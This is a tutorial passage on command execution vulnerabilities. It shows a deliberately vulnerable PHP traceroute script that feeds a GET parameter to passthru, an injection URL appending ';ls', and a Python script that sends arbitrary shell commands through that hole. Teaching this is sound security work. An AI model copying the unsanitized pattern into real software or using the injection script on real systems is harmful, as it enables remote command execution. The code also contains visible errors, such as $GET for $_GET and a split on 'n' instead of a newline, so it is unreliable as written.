## Command Execution Vulnerabilities

Command execution vulnerabilities allow arbitrary commands to be executed through a script due to validation checking. In this section we will explore a command execution vulnerability and see how to build a quick script. Not all vulnerabilities will be this straightforward, but knowing how these will help us when we encounter more complicated examples in the wild.

Command execution vulnerabilities are the result of passing poorly sanitized information to a shell function such as passthru or system. By injecting additional code, we can cause these functions to execute commands that we want in addition to (or instead of) the commands they were intended to run. Let's take a look at an example.

```php
<?php
if($_GET['ip'])
{
    print "<PRE>";
    passthru("/usr/local/bin/traceroute ".$GET['ip']);
    print "</PRE>";
}
?>
```

In this code example, the intent of the script is to allow the user to input an IP address and have the script print traceroute results. Someone might set up a script like this for debugging network problems. The problem is that without sanitizing the IP address, users can chain commands to traceroute. Let's save the code as traceroute.php and exploit it.

By going to the URL http://localhost/traceroute.php?ip=127.0.0.1;ls we can see, in addition to printing our traceroute results, a directory listing. If we had sanitized our $_GET['ip'] variable to make it shell-safe, this would not be an issue. Sometimes, though, we really want to be able to process the information in ways other than through the Web page. Let's build a script to help parse the data.

```python
#!/usr/bin/python
import httplib, urllib, sys
data = "".join(sys.argv[1:])
c = httplib.HTTPConnection("localhost:80")
opts = urllib.urlencode({'ip': "127.0.0.1;" + data})
req = "/traceroute.php?" + opts
c.request('GET', req)
resp = c.getresponse()
data = resp.read()
c.close()
lines = data.split("n")
print("\n".join(lines[1:-7]))
```
